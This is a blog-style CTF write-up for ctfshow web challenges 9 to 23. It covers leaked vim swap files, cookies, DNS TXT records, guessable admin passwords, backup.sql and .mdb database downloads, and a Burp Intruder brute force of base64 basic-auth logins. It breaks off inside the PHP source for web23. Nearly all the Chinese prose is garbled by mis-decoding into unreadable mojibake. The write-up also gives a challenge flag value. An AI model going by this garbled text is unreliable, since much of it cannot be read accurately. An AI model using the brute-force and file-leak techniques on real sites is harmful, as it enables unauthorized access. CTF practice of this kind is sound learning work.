<h4 id="git-svn-æ³„éœ²"><a href="#git-svn-æ³„éœ²" class="headerlink" title="git svn æ³„éœ²"></a>git svn æ³„éœ²</h4><p>â€‹     <strong>gitä¸svnçš„åŒºåˆ«ï¼š</strong><br>1.gitæ˜¯åˆ†å¸ƒå¼çš„ï¼Œsvnæ˜¯é›†ä¸­å¼çš„<br>2.gitå°†æ¯ä¸ªå†å²ç‰ˆæœ¬éƒ½å­˜å‚¨å®Œæ•´çš„æ–‡ä»¶ï¼Œsvnåªæ˜¯å­˜å‚¨å·®å¼‚çš„æ–‡ä»¶ï¼Œå†å²ç‰ˆæœ¬ä¸å¯æ¢å¤<br>3.gitå¯ä»¥ç¦»çº¿å®Œæˆå¤§éƒ¨åˆ†çš„æ“ä½œï¼Œsvnä¸å¯ä»¥ç¦»çº¿æ“ä½œ<br>4.gitå¯ä»¥å®ç°åˆ†æ”¯åˆå¹¶<br>5.gitå¯ä»¥ä¿®æ”¹å’Œæ’¤é”€ä¿®æ”¹å†å²ç‰ˆæœ¬<br>6.gité€Ÿåº¦å¿«ï¼Œæ•ˆç‡é«˜<br>7.gitæœ‰æœ¬åœ°ä»“åº“<br>8.gitä»¥å…ƒæ•°æ®æ–¹å¼å­˜å‚¨ï¼Œsvnä»¥åŸå§‹æ–‡ä»¶å­˜å‚¨</p>
<p>è¯¦ç»†å†…å®¹è¯·ç™¾åº¦ï¼š<a href="https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_3_dg&wd=git%E5%92%8Csvn&oq=git&rsv_pq=b430d72200b4dd6f&rsv_t=999c8e4eC5soN/fN57lz7fw37UWO8FFEV83oxK4Llmxk1PdSlz9Mtjcx5JkGUeJCSXoZ&rqlang=cn&rsv_dl=tb&rsv_enter=1&rsv_sug3=8&rsv_sug1=7&rsv_sug7=100&rsv_sug2=0&rsv_btype=t&inputT=5881&rsv_sug4=9087">gitå’Œsvn</a></p>
<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>å®˜æ–¹æç¤ºï¼šå‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†ã€‚</p>
<p>vimåœ¨ç¼–è¾‘æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€ä¸ªå¤‡ä»½ï¼Œåç¼€å.swpï¼Œå¦‚æœçªç„¶æ–­ç”µï¼Œè¿™ä¸ªå¤‡ä»½æ–‡ä»¶å°±ä¼šç•™å­˜ä¸‹æ¥ï¼Œå¯ä»¥è¢«äººè®¿é—®åˆ°ã€‚</p>
<p>ç”±é¢˜ç›®ä¸­çš„æç¤ºå¯ä»¥çŸ¥é“ï¼Œvimä¿®æ”¹çš„æ–‡ä»¶å¹¶æ²¡æœ‰ä¿å­˜åå…³é—­è€Œæ˜¯ç›´æ¥å…³é—­ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡ä¼šäº§ç”Ÿä¸€ä¸ª.&lt;æ–‡ä»¶å&gt;.php.swpæ–‡ä»¶ï¼Œç¬¬äºŒæ¬¡ä¼šæœ‰ä¸€ä¸ª.&lt;æ–‡ä»¶å&gt;.php.swoæ–‡ä»¶ï¼Œç¬¬ä¸‰æ¬¡ä¼šæœ‰ä¸€ä¸ª.&lt;æ–‡ä»¶å&gt;.php.swnæ–‡ä»¶ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/47bf101e57d04da187598dcc27d1fd49.png#pic_center" alt="10"></p>
<p>è®¿é—®url&#x2F;index.php.swpå¯ä»¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼Œflagå°±åœ¨è¿™é‡Œã€‚</p>
<p>â€‹       è¯•ç€è®¿é—®ä¸€ä¸‹åä¸¤ä¸ªæ–‡ä»¶ã€‚</p>
<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>æç¤ºï¼šcookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</p>
<p>è¿˜æ˜¯è¿™ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/ef469b9758f141a19ca3fddc186a24d3.png" alt="11"></p>
<p>æ—¢ç„¶æœ‰æç¤ºï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹cookieï¼š<img src="https://img-blog.csdnimg.cn/439d83193a654d5bbb1e63afc6ac2b4b.png" alt="12"><br>flagåˆ°æ‰‹ã€‚</p>
<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>æç¤ºï¼šåŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚flag.ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡ã€‚<br>æ—¢ç„¶è¯´äº†åŸŸåéšè—ä¿¡æ¯é‚£æˆ‘ä»¬ç”¨<a href="http://dbcha.com/">dnsæ£€æŸ¥æŸ¥è¯¢</a><br><img src="https://img-blog.csdnimg.cn/f1d3798a100d410ab33338bcf3fad2cd.png" alt="13">åœ¨txtæ å¾—åˆ°flagã€‚ï¼ˆTXT è®°å½•ï¼Œä¸€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜ã€‚ï¼‰</p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>æœ‰æç¤ºï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç <br>é‚£æ‰¾æ‰¾å¯†ç ï¼Œå¸®åŠ©çƒ­çº¿å·ç å¥½åƒå¯†ç ã€‚<img src="https://img-blog.csdnimg.cn/7f1240fdcf74469cb9d089eba6742563.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å…¥åå°çœ‹çœ‹ï¼š<br><img src="https://img-blog.csdnimg.cn/22ac034131d54e918c466f472da1f461.png" alt="14"><br>æœç„¶ï¼Œè¾“å…¥å¯†ç åflagæ˜¾ç°ctfshow{c9494549-232c-4a44-af85-06574f2ed4b7}</p>
<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>çœ‹æç¤ºï¼šæŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç <br>çœ‹äº†ä¸€éç½‘é¡µï¼Œå‘ç°åº•éƒ¨æœ‰ä¸ªdocumentï¼Œç‚¹å¼€çœ‹çœ‹ï¼š<br><img src="https://img-blog.csdnimg.cn/677b3711b60c469dbaf0f866ae4119cc.png" alt="15"><br>å“ˆå“ˆè¯•è¯•å‘—<br><img src="https://img-blog.csdnimg.cn/0ad9cac0edb94e54baccc03df56b8e8c.png" alt="16"></p>
<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>æç¤ºï¼šæœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº<br>å¾¡å‰‘æ‰«æä¸€ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/6c8b1c4eb3ac4d29a51186d2839221eb.png" alt="17">ä¸é”™ï¼Œè¿›å…¥&#x2F;editorçœ‹çœ‹ï¼š<br><img src="https://img-blog.csdnimg.cn/0ef15f64db654755aec7a7a7c00fa38b.png" alt="18">ç„¶åç‚¹ä¸Šä¼ æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ç©ºé—´ä¸­æŒ‰<strong>tmp&#x2F;html&#x2F;nothinghere</strong>è¿™ä¸ªè·¯å¾„æ‰¾åˆ°fl000g.txtï¼Œç¡®å®šï¼Œå¾—åˆ°ä¸€å †è·¯å¾„, å‰é¢çš„æ˜¯ç¼–è¯‘å™¨çš„ç»å¯¹è·¯å¾„ï¼Œæˆ‘ä»¬è®¿é—®åé¢çš„**&#x2F;nothinghere&#x2F;fl000g.txt**å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p>
<h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>æç¤ºï¼š<strong>å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</strong></p>
<p>è¿›å…¥é¢˜ç›®åçœ‹åˆ°æœ‰ä¸ªQQé‚®ç®±ï¼Œæˆ‘ä»¬æœä¸€ä¸‹å®ƒçš„QQã€‚æ²¡å•¥ä¿¡æ¯ï¼Œè¿”å›åˆ°åˆšæ‰çš„ç½‘ç«™åŠ åç¼€çœ‹èƒ½ä¸èƒ½è¿›å»åå°ï¼š<br><img src="https://img-blog.csdnimg.cn/da05c6a03cad4131b2f010f9538c5320.png" alt="15"><br>ä¸çŸ¥é“ç”¨æˆ·åå¯†ç å“ï¼Œé‚£å¿˜è®°å¯†ç å§ï¼å‘ç°ä¸€ä¸ªä¿¡æ¯ï¼š<br><img src="https://img-blog.csdnimg.cn/f22b46a6672d4a4bb5acecc3ff05f611.png" alt="15"><br>åˆšæ‰æœçš„QQç”¨æˆ·åœ¨è¥¿å®‰ï¼Œæˆ‘ä»¬ è¯•è¯•ï¼Œ<img src="https://img-blog.csdnimg.cn/2b245d352a024f6aae4c1a9f4c76ccaa.png" alt="15"><br>æœç„¶ä¸å‡ºæˆ‘æ‰€æ–™ï¼Œç„¶åè¿”å›è¾“å…¥å¯†ç ï¼Œå¾—åˆ°flagã€‚</p>
<h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>æç¤ºï¼š<strong>å¯¹äºæµ‹è¯•ç”¨çš„æ¢é’ˆï¼Œä½¿ç”¨å®Œæ¯•åè¦åŠæ—¶åˆ é™¤ï¼Œå¯èƒ½ä¼šé€ æˆä¿¡æ¯æ³„éœ²</strong><br>å•¥æ˜¯æ¢é’ˆå‘¢ï¼Ÿæœç´¢ä¸€ä¸‹ï¼Œæœ€åçœ‹åˆ°æœ‰å…³äºPHPæ¢é’ˆçš„è§£é‡Š</p>
<blockquote>
<p>phpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚</p>
</blockquote>
<p>å…·ä½“è§£é‡Šè¯·ç‚¹å‡»<a href="https://baike.baidu.com/item/PHP%E6%8E%A2%E9%92%88/10922752">phpæ¢é’ˆ</a>ã€‚<br><img src="https://img-blog.csdnimg.cn/20be60559dd64161aeb30a72d6de10ca.png" alt="16">æˆ‘ä»¬è¯•è¯•**&#x2F;tz.php**<img src="https://img-blog.csdnimg.cn/25ab292735884c0f9edaf18fc619f12e.png" alt="16"><img src="https://img-blog.csdnimg.cn/38ddc1cf0aa64edca4df5cdde973a6af.png" alt="16"></p>
<p>æœ‰ä¸ªPHPä¿¡æ¯ï¼Œæ‰“å¼€çœ‹çœ‹:<img src="https://img-blog.csdnimg.cn/cd667b76d4134efdb200a483efa46f30.png" alt="16"><br>æ‰“å¼€ä¹‹åç›´æ¥æ‰¾å…³é”®å­—ç¬¦â€œctfshowâ€ï¼Œå¾—åˆ°flagã€‚</p>
<h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>æç¤ºï¼š<strong>å¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯</strong><br>æ²¡æ€è·¯å•Š<img src="https://img-blog.csdnimg.cn/ba8913b0cb3f4a9b82985fa9246120ab.png" alt="17">æˆ‘åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹<strong>æŸ¥çœ‹è‡ªå·±å¤‡ä»½çš„SQLæ–‡ä»¶</strong>ä¹Ÿä¸çŸ¥é“æ€ä¹ˆåŠã€‚ä½†å¤‡ä»½çš„è‹±è¯­å¥½åƒæ˜¯backupï¼Œçœ‹ä¸€ä¸‹**&#x2F;backup.sqlæ–‡ä»¶**ï¼Œæ‰¾åˆ°flagã€‚</p>
<h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>sqlæ–‡ä»¶çš„å¤‡ä»½ä¸€èˆ¬ä¸º<strong>backup.sql</strong></p>
<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>æç¤ºï¼š<strong>ä¸è¦ç€æ€¥ï¼Œä¼‘æ¯ï¼Œä¼‘æ¯ä¸€ä¼šå„¿ï¼Œç©101åˆ†ç»™ä½ flag</strong><br>æˆ‘ç¬¬ä¸€ååº”å°±æ˜¯æŠ“åŒ…æ”¹æ•°æ®ï¼Œé‚£å°±è¯•è¯•å§ï¼<br>æŠ“äº†å¥½å‡ æ¬¡ï¼Œæ²¡ç”¨ã€‚åƒå¾€å¸¸ä¸€æ ·ï¼Œçœ‹çœ‹æºä»£ç <img src="https://img-blog.csdnimg.cn/17d6f2c0470645ee9e9d2bd951f760b3.png" alt="18">ç‚¹å¼€çœ‹çœ‹ï¼š<br><img src="https://img-blog.csdnimg.cn/c113565d12794d029a997ed511c7685f.png" alt="18"><br>ç›´æ¥æ‰¾â€œctfshowâ€æ‰¾ä¸åˆ°ï¼Œé‚£çœ‹çœ‹æœ‰ä»€ä¹ˆé—´æ¥çš„ä¿¡æ¯ã€‚<img src="https://img-blog.csdnimg.cn/6e200f592d7c46c794731761f8662f69.png" alt="18">å¥½åƒæœ‰çº¿ç´¢ï¼Œæ˜¯æŸç§ç±»å‹çš„ç¼–ç ï¼Œå°è¯•è§£ä¸€ä¸‹ã€‚<br><img src="https://img-blog.csdnimg.cn/51a0c388d55b4cb6896c98cfbecab8bb.png" alt="18"><br>å»110.phpçœ‹çœ‹,å‡ºç°flagã€‚</p>
<h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>æç¤ºï¼š<strong>å¯†é’¥ä»€ä¹ˆçš„ï¼Œå°±ä¸è¦æ”¾åœ¨å‰ç«¯äº†</strong><br><img src="https://img-blog.csdnimg.cn/e438c4cc7a9f4e98ba0cbd0220c26d37.png" alt="19">æ˜¯ç”¨postä¼ å…¥çš„ï¼Œ<br><img src="https://img-blog.csdnimg.cn/103ae3bb049e418e98478720a13f1862.png" alt="19"><br>å¾—åˆ°flagã€‚</p>
<h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><p>ç¬¬ä¸€ååº”çœ‹åˆ°æœ‰è´¦å·å¯†ç æ—¶æˆ‘å°±ç›´æ¥è¾“å…¥äº†ï¼Œé‚£è‚¯å®šæ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰ä»”ç»†çœ‹é¢˜æ„ã€‚é”™äº†ä¹‹åæ‰çŸ¥é“æ˜¯postä¼ å‚ã€‚<br><strong>åçœï¼šä¸€å®šè¦ä»”ç»†å®¡ä»£ç ï¼Œè¿™å…³ä¹ç€æˆè´¥ã€‚</strong></p>
<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><blockquote>
<p>æç¤ºï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/41c86488b14649d38f44842262868a26.png" alt="20"></p>
<p>asp+accessæœ€å¤§çš„å®‰å…¨éšæ‚£åœ¨äºaccessæ•°æ®åº“å¯ä»¥è¢«åˆ«äººä¸‹è½½ã€‚<br>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ ç›´æ¥æŸ¥çœ‹urlè·¯å¾„æ·»åŠ &#x2F;db&#x2F;db.mdb ä¸‹è½½æ–‡ä»¶é€šè¿‡txtæ‰“å¼€æˆ–è€…é€šè¿‡EasyAccess.exeæ‰“å¼€æœç´¢flag</p>
<h4 id="ACCESSæ•°æ®åº“çš„éšæ‚£"><a href="#ACCESSæ•°æ®åº“çš„éšæ‚£" class="headerlink" title="ACCESSæ•°æ®åº“çš„éšæ‚£"></a>ACCESSæ•°æ®åº“çš„éšæ‚£</h4><h5 id="Accessæ•°æ®åº“çš„å­˜å‚¨éšæ‚£"><a href="#Accessæ•°æ®åº“çš„å­˜å‚¨éšæ‚£" class="headerlink" title="Accessæ•°æ®åº“çš„å­˜å‚¨éšæ‚£"></a>Accessæ•°æ®åº“çš„å­˜å‚¨éšæ‚£</h5><p>åœ¨ASPï¼‹Accessåº”ç”¨ç³»ç»Ÿä¸­ï¼Œå¦‚æœè·å¾—æˆ–è€…çŒœåˆ°Accessæ•°æ®åº“çš„å­˜å‚¨è·¯å¾„å’Œæ•°æ®åº“åï¼Œåˆ™è¯¥æ•°æ®åº“å°±å¯ä»¥è¢«ä¸‹è½½åˆ°æœ¬åœ°ã€‚</p>
<h5 id="Accessæ•°æ®åº“çš„è§£å¯†éšæ‚£"><a href="#Accessæ•°æ®åº“çš„è§£å¯†éšæ‚£" class="headerlink" title="Accessæ•°æ®åº“çš„è§£å¯†éšæ‚£"></a>Accessæ•°æ®åº“çš„è§£å¯†éšæ‚£</h5><p>ç”±äºAccessæ•°æ®åº“çš„åŠ å¯†æœºåˆ¶éå¸¸ç®€å•ï¼Œæ‰€ä»¥å³ä½¿æ•°æ®åº“è®¾ç½®äº†å¯†ç ï¼Œè§£å¯†ä¹Ÿå¾ˆå®¹æ˜“ã€‚è¯¥æ•°æ®åº“ç³»ç»Ÿé€šè¿‡å°†ç”¨æˆ·è¾“å…¥çš„å¯†ç ä¸æŸä¸€å›ºå®šå¯†é’¥è¿›è¡Œå¼‚æˆ–æ¥å½¢æˆä¸€ä¸ªåŠ å¯†ä¸²ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ï¼Š.mdbæ–‡ä»¶ä¸­ä»åœ°å€â€œï¼†H42â€å¼€å§‹çš„åŒºåŸŸå†…ã€‚ç”±äºå¼‚æˆ–æ“ä½œçš„ç‰¹ç‚¹æ˜¯â€œç»è¿‡ä¸¤æ¬¡å¼‚æˆ–å°±æ¢å¤åŸå€¼â€ï¼Œå› æ­¤ï¼Œç”¨è¿™ä¸€å¯†é’¥ä¸ï¼Š.mdbæ–‡ä»¶ä¸­çš„åŠ å¯†ä¸²è¿›è¡Œç¬¬äºŒæ¬¡å¼‚æˆ–æ“ä½œï¼Œå°±å¯ä»¥è½»æ¾åœ°å¾—åˆ°Accessæ•°æ®åº“çš„å¯†ç ã€‚åŸºäºè¿™ç§åŸç†ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°ç¼–åˆ¶å‡ºè§£å¯†ç¨‹åºã€‚</p>
<h5 id="ç¨‹åºè®¾è®¡ä¸­çš„å®‰å…¨éšæ‚£"><a href="#ç¨‹åºè®¾è®¡ä¸­çš„å®‰å…¨éšæ‚£" class="headerlink" title="ç¨‹åºè®¾è®¡ä¸­çš„å®‰å…¨éšæ‚£"></a>ç¨‹åºè®¾è®¡ä¸­çš„å®‰å…¨éšæ‚£</h5><p>ASPä»£ç åˆ©ç”¨è¡¨å•ï¼ˆformï¼‰å®ç°ä¸ç”¨æˆ·äº¤äº’çš„åŠŸèƒ½ï¼Œè€Œç›¸åº”çš„å†…å®¹ä¼šåæ˜ åœ¨æµè§ˆå™¨çš„åœ°å€æ ä¸­ï¼Œå¦‚æœä¸é‡‡ç”¨é€‚å½“çš„å®‰å…¨æªæ–½ï¼Œåªè¦è®°ä¸‹è¿™äº›å†…å®¹ï¼Œå°±å¯ä»¥ç»•è¿‡éªŒè¯ç›´æ¥è¿›å…¥æŸä¸€é¡µé¢ã€‚ä¾‹å¦‚åœ¨æµè§ˆå™¨ä¸­æ•²å…¥â€œâ€¦â€¦ page.asp?x&#x3D;1â€ï¼Œå³å¯ä¸ç»è¿‡è¡¨å•é¡µé¢ç›´æ¥è¿›å…¥æ»¡è¶³â€œx&#x3D;1â€æ¡ä»¶çš„é¡µé¢ã€‚å› æ­¤ï¼Œåœ¨è®¾è®¡éªŒè¯æˆ–æ³¨å†Œé¡µé¢æ—¶ï¼Œå¿…é¡»é‡‡å–ç‰¹æ®Šæªæ–½æ¥é¿å…æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚ </p>
<h4 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h4><p>è‡ªå·±åœ¨ç½‘ä¸Šæœç´¢</p>
<h2 id="çˆ†ç ´ç¯‡"><a href="#çˆ†ç ´ç¯‡" class="headerlink" title="çˆ†ç ´ç¯‡"></a>çˆ†ç ´ç¯‡</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>æç¤ºï¼š<strong>çˆ†ç ´ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯åŸºæ“</strong><br><img src="https://img-blog.csdnimg.cn/50dec98ecd16438d95781995e710e7a3.png" alt="21"><br>ç»™äº†ä¸€ä¸ªå­—å…¸æ–‡ä»¶ï¼Œä¿å­˜ä¸€ä¸‹è¦ç”¨åˆ°ã€‚<br>æ‰“å¼€é“¾æ¥åè®©æˆ‘ä»¬è¾“å…¥è´¦å·å¯†ç ï¼Œæ˜æ˜¾éœ€è¦ç”¨bpæŠ“åŒ…ã€‚<img src="https://img-blog.csdnimg.cn/2c342a9ab4b943a199bcd52181f7d1c2.png" alt="21"><br>è¢«åŠ å¯†äº†ï¼Œbase64è§£å¯†åå¾—åˆ°<strong>ç”¨æˆ·:å¯†ç </strong><img src="https://img-blog.csdnimg.cn/dbf26459f49b4fb0bee29e0f9db2aed4.png" alt="21">OKï¼Œæˆ‘ä»¬sent to intruder<img src="https://img-blog.csdnimg.cn/612dc5429f6449928acd8dbb5fb6e1c4.png" alt="21">è®¾ç½®å¥½è¦çˆ†ç ´çš„å†…å®¹ï¼Œåˆ‡æ¢åˆ°payloadsé¡µé¢<img src="https://img-blog.csdnimg.cn/944254253a544554ac2bc595ad056408.png" alt="21"><br>æ·»åŠ ç¬¬ä¸€éƒ¨åˆ†ï¼šç”¨æˆ·å<img src="https://img-blog.csdnimg.cn/df3fba6b116e4dac8fb8bbd36de533ee.png" alt="21"><br>æ·»åŠ ç¬¬äºŒéƒ¨åˆ†ï¼š**:**ï¼ˆè‹±æ–‡çŠ¶æ€ä¸‹ï¼‰<img src="https://img-blog.csdnimg.cn/81b9ffed5f5a44618a64d6214facd8d4.png" alt="21">æ·»åŠ ç¬¬ä¸‰éƒ¨åˆ†ï¼šå¯†ç ï¼Œç”¨åˆšæ‰ä¸‹è½½çš„æ–‡ä»¶å­—å…¸ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/007a60a2824640ac90862574538a5351.png" alt="21">åˆ«å¿˜äº†å†ç¼–ç ï¼Œå› ä¸ºæŠ“åŒ…æ—¶ç”¨æˆ·å¯†ç è¢«åŠ å¯†äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/fe997425d5384d519b2a115c77240b45.png" alt="21"><br>å–æ¶ˆå‹¾é€‰<img src="https://img-blog.csdnimg.cn/3d0bcebe5ac64f0bb317a4d11aa12ade.png" alt="21"><br>å¼€å§‹çˆ†ç ´ï¼Œ<img src="https://img-blog.csdnimg.cn/da957508a007461b85eef29e440333e9.png" alt="21">å¾—åˆ°å¯†ç ï¼Œç„¶åå†base64è§£ç ï¼Œå¾—åˆ°ç”¨æˆ·å¯†ç ï¼Œè¾“å…¥ä¹‹åä¾¿å¯å¾—åˆ°flagã€‚<img src="https://img-blog.csdnimg.cn/eeb4c1d85335439da11f57fd4d455aac.png" alt="21"></p>
<h4 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><p>æŠ“åŒ…åæ˜¯å¾—åˆ°åŠ å¯†åçš„ç”¨æˆ·å¯†ç ï¼Œç„¶åè§£å¯†åçœ‹åˆ°ç”¨æˆ·å¯†ç è¢«åŠ å·¥äº†ã€‚å°†æ•°æ®å‘é€åˆ°çˆ†ç ´æ¨¡å—ï¼Œé€‰ä¸­base64ç¼–ç åçš„ç”¨æˆ·åå’Œå¯†ç ã€‚é€‰æ‹©payloadsï¼Œè®¾ç½®ä¸ºcustom iterator(è‡ªå®šä¹‰è¿­ä»£å™¨)<strong>è‡ªå®šä¹‰è¿­ä»£å™¨å¯ä»¥è‡ªå®šä¹‰æ‹¼æ¥æ–¹å¼</strong> positionçš„ä½ç½®å³ä¸ºæˆ‘ä»¬çš„æ‹¼æ¥æ–¹å¼ï¼Œæ ¹æ®ä¸Šè¿°base64è§£ç çš„tomcatå¯†ç çš„æ ¼å¼ï¼šç”¨æˆ·å:å¯†ç  â€”â€“&gt;åˆ™positionçš„ä½æ•°ä¸º3ã€‚3ä¸ªæ‹¼æ¥å®Œæˆåï¼Œéœ€è¦è¿›è¡Œbase64ç¼–ç ï¼›<strong>payload processing</strong> è¿›è¡Œç¼–ç è®¾ç½®ã€‚å–æ¶ˆPalyload Encodingç¼–ç ã€‚ç„¶åçˆ†ç ´æˆåŠŸï¼</p>
<h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>æç¤ºï¼š<strong>åŸŸåä¹Ÿå¯ä»¥çˆ†ç ´çš„ï¼Œè¯•è¯•çˆ†ç ´è¿™ä¸ªctf.showçš„å­åŸŸå</strong></p>
<p><a href="https://phpinfo.me/domain">æŸ¥è¯¢ä¸€ä¸‹ä»–çš„å­åŸŸå</a>ï¼Œæœ€ååœ¨<strong>vip.ctf.show</strong>çš„æºä»£ç ä¸­çœ‹åˆ°äº†flagã€‚<img src="https://img-blog.csdnimg.cn/3dfd59da05a249dd989cea14e7f0d166.png" alt="22"></p>
<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><strong>æç¤ºï¼šè¿˜çˆ†ç ´ï¼Ÿè¿™ä¹ˆå¤šä»£ç ï¼Œå‘Šè¾ï¼</strong><br>å¥½åƒæ²¡ä»€ä¹ˆåµç”¨ã€‚å¾€ä¸‹çœ‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
